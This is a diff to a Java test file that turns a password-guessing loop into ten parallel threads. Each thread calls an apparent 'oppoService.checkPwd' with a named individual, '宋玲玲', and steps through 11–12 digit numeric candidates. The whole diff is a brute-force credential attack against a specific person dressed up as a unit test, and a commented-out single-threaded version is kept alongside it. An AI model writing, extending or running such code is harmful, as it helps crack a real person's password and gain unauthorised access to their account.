@@ -46,14 +46,78 @@ public class MTest {
 
 
     @Test
-    public void test03() {
-        c(3600L);
+    public void test03() throws InterruptedException {
+        dT t1 = new dT();
+        t1.setI(10000000000L);
+        dT t2 = new dT();
+        t2.setI(20000000000L);
+        dT t3 = new dT();
+        t3.setI(30000000000L);
+
+        dT t4 = new dT();
+        t4.setI(40000000000L);
+        dT t5 = new dT();
+        t5.setI(50000000000L);
+        dT t6 = new dT();
+        t6.setI(60000000000L);
+
+        dT t7 = new dT();
+        t7.setI(70000000000L);
+        dT t8 = new dT();
+        t8.setI(80000000000L);
+        dT t9 = new dT();
+        t9.setI(90000000000L);
+        dT t0 = new dT();
+        t0.setI(0L);
+
+        t1.start();
+        t2.start();
+        t3.start();
+        t4.start();
+        t5.start();
+        t6.start();
+        t7.start();
+        t8.start();
+        t9.start();
+        t0.start();
+
+        Thread.sleep(Long.MAX_VALUE);
     }
 
-    private void c(Long l) {
-        while (l.toString().length() < 11) {
-            oppoService.checkPwd("宋玲玲", l, 11);
-            l++;
+
+//    class tt implements Runnable {
+//
+//        @Override
+//        public void run() {
+//            System.out.println("ewewq");
+//            Long l = 1000L;
+//            while (l.toString().length() < 11) {
+//                oppoService.checkPwd("宋玲玲", l, 11);
+//                l++;
+//            }
+//            System.out.println("ewewq");
+//        }
+//    }
+
+    public class dT extends Thread {
+
+        private Long l;
+
+        public Long getI() {
+            return l;
+        }
+
+        public void setI(Long l) {
+            this.l = l;
+        }
+
+        @Override
+        public void run() {
+
+            while (l.toString().length() <= 11) {
+                oppoService.checkPwd("宋玲玲", l, 11);
+                l++;
+            }
         }
     }
 }
